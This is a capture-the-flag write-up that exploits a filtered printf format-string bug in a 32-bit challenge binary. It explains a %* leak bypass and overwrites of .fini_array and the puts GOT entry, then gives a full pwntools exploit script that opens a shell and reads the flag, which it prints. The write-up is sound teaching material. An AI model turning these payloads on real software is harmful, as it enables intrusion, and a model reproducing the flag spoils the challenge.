# Echo Chamber writeup

## Description

I made an echo chamber that reverberate your input using the good old `printf`.
Surely it will be safe if I made a filter for it, right?

`$ nc something.challenge.cr3c.tf 1337`

flag is at `/flag`

**author**: Lio

## Protection checking

The program disables PIE and RELRO, meaning we can overwrite something in the GOT section.

```txt
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8046000)
    RUNPATH:  b'.'
```

## Program flow

The program reads our input and will either call `puts()` or `printf()` on it after going through a `filter()` function.

```c
void main() {
    init();
    char buf[72];
    int len = 0;
    puts("Welcome to my echo chamber!");
    write(1, "Shout your message: ", 20);
    len = read(0, buf, 72);
    buf[len] = 0;
    puts("Your message is:");
    filter(buf, len);
}
```

The `filter()` function forbiddens us from using almsot all possible format strings leak characters such as `%d`, `%x`, `%p`,...

```c
void filter(char* buf, int len) {
    long i;
    for(i = 0; i < len; i++) {
        switch(buf[i])
        {
            case 'a':
            case 'A':
            case 'b':
            case 'B':
            case 'd':
            case 'e':
            case 'E':
            case 'f':
            case 'F':
            case 'g':
            case 'G':
            case 'i':
            case 'o':
            case 'p':
            case 's':
            case 'u':
            case 'x':
            case 'X':
                puts(buf);
                return;
            default:
                continue;
        }
    }
    printf(buf);
}
```

But there're still `%n` (for writing) and `%c` (for 1 byte leaking), which is not useful at this moment since there's no call to a libc function after `printf()`.

## Bypass the filter function

You can still get a 4 bytes leak from the current index of the format string in decimal notaion simply by using `%*`.

And since the program runs in 32-bit, we can leak the full address of the program as well as the libc.

The address of `main()+158` (holds the value `0x804936b`) is at the 11th index so we can do a fact check of this method.

```txt
Welcome to my echo chamber!
Shout your name: %c %c %c %c %c %c %c %c %c %c %*
Your message is:
� < , �   ! � � � %134517611
```

Voila! Note that this is 2's signed complement therefore any value greater than `0x7fffffff` (libc and stack addresses) will be displayed as negative numbers.

Now that we got a leak, the only remaining problem is how can we utilize `printf()` to overwrite any section we want.

But like I said above, there's no call to libc function after `printf()` so overwriting the GOT is not the right move here.

## Function call after main exits

If the program exits via `return` or a call to libc's `exit()` function, the libc will execute a function called `__run_exit_handlers()` which will call every destructor functions of the program located in the `.fini_array` (formally called `.dtors`) section of the binary.

We can find the offset of `.fini_array` via `readelf -d`.

```txt
Dynamic section at offset 0x21b4 contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x8049000
 0x0000000d (FINI)                       0x80493a8
 0x00000019 (INIT_ARRAY)                 0x804b1ac
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x804b1b0
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481cc
 0x00000005 (STRTAB)                     0x80482bc
 0x00000006 (SYMTAB)                     0x80481ec
 0x0000000a (STRSZ)                      157 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804b2ac
 0x00000002 (PLTRELSZ)                   56 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80483d4
 0x00000011 (REL)                        0x80483b4
 0x00000012 (RELSZ)                      32 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048374
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x804835a
 0x00000000 (NULL)                       0x0
```

Since the program doesn't have any user-defined destructor function, `.fini_array` section only holds the address of 1 function which is `__do_global_dtors_aux()`.

And because RELRO is disabled, we can overwrite this section and replace it with the address of the `main()` function, therefore giving us one more chance to call `printf()`. We can also leak the stack address via the 1st call to `printf()` so that we can overwrite the return address of the 2nd call to `main()` to be well... `main()` again.

The `puts()` function only gets called if our input contains at least 1 forbidden character inside the `filter()` function. We can overwrite the GOT entry of `puts()` into `system()` function and utilize this to get a shell.

This exploit may not work if the stack address we want to overwrite contains at least one forbidden character (very small chance) => Little brute forcing.

## PoC

```py
from pwn import *

context.binary = exe = ELF('chal')
libc = ELF('libc.so.6')

def convert(int_num):
    if int_num < 0:
        int_num = int_num + 2**32
    return int_num

def craft_1(addr, value):
    target_low = value & 0xffff
    target_high = value >> 16
    payload = f'%{target_high-16}c%27$hn%{target_low-target_high}c%26$hn'.encode().ljust(28, b'-')
    payload += p32(addr) + p32(addr+2)
    return payload

def craft_2(addr_1, value_1, addr_2, value_2):
    target_low_1 = value_1 & 0xffff
    target_high_1 = ((value_1 & 0xffff0000) >> 16)
    target_low_2 = (value_2 & 0xffff)
    target_high_2 = ((value_2 & 0xffff0000) >> 16)

    if target_low_1 < target_low_2:
        write_1 = target_low_1
        idx_1 = 31
        write_2 = target_low_2
        idx_2 = 33
    else:
        write_1 = target_low_2
        idx_1 = 33
        write_2 = target_low_1
        idx_2 = 31

    payload = f'%{target_high_1}c%32$hn%{write_1-target_high_1}c%{idx_1}$hn'
    payload += f'%{write_2-write_1}c%{idx_2}$hn%{target_high_2-write_2}c%34$hn'
    payload = payload.encode().ljust(56, b'-')
    payload += p32(addr_1) + p32(addr_1+2) + p32(addr_2) + p32(addr_2+2)
    return payload

io = process()
# gdb.attach(io, api=True)

fini_array = exe.get_section_by_name('.fini_array').header.sh_addr
payload = b'%c%*----' + craft_1(fini_array, exe.sym['main'])
payload += b'69' + b"%c"*7 + b"%*"
io.sendlineafter(b'message: ', payload)

io.recvuntil(b'is:\n')
io.recv(2)
libc.address = convert(int(io.recv(10))) - libc.sym['stdout']

io.recvuntil(b'69')
io.recv(8)
buffer = convert(int(io.recvline(keepends=False)))

log.info(f'buffer address: {hex(buffer)}')
log.info(f'libc base: {hex(libc.address)}')

payload = craft_2(buffer-88, exe.sym['main'], exe.got['puts'], libc.sym['system'])
io.sendafter(b'message: ', payload)

io.sendlineafter(b'message: ', b'cat /flag')
io.interactive()

# cr3{1_th0ught_main_w45_th3_3nd}
```